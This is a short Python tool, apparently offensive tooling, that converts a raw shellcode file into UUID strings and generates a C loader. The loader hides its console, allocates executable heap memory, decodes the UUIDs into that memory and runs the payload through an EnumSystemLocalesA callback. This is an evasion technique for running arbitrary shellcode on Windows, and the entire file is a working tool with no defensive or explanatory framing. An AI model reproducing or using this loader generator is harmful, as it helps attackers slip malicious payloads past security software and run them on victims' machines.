#!/usr/bin/python

import sys
import os
from termcolor import colored
from uuid import UUID

def UUIDSehllcode():
    shellcode_add = input("\033[4mPlease input Shellcode:\033[0m" + colored(" >>", "green"))
    offset = 0
    with open(shellcode_add, "rb") as f:
        bin = f.read()

    out = ""

    while (offset < len(bin)):
        countOfBytesToConvert = len(bin[offset:])
        if countOfBytesToConvert < 16:
            ZerosToAdd = 16 - countOfBytesToConvert
            byteString = bin[offset:] + (b'\x00' * ZerosToAdd)
            uuid = UUID(bytes_le=byteString)
        else:
            byteString = bin[offset:offset + 16]
            uuid = UUID(bytes_le=byteString)
        offset += 16

        out += "\"{}\",\n".format(uuid)

    load = '''   
        #include <windows.h>
        #include <rpc.h>
        #include <stdio.h>
                
        const char* uuids[] ;
        
int main()
{
    FreeConsole();
    HANDLE hc = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
    void* ha = HeapAlloc(hc, 0, 0x100000);
    DWORD_PTR hptr = (DWORD_PTR)ha;
    int elems = sizeof(uuids) / sizeof(uuids[0]);
    
    for (int i = 0; i < elems; i++) {
        RPC_STATUS status = UuidFromStringA((RPC_CSTR)uuids[i], (UUID*)hptr);
        if (status != RPC_S_OK) {
            printf("UuidFromStringA() != S_OK");
            CloseHandle(ha);
            return -1;
        }
         hptr += 16;
    }
    EnumSystemLocalesA((LOCALE_ENUMPROCA)ha, 0);
    CloseHandle(ha);
    return 0;
}
    '''

    shellcodes = "uuids[] = {" + out + "}"
    loads = load.replace('uuids[]', shellcodes, 1)
    with open('/root/shellcode.c', 'w+') as f:
        f.write(loads)
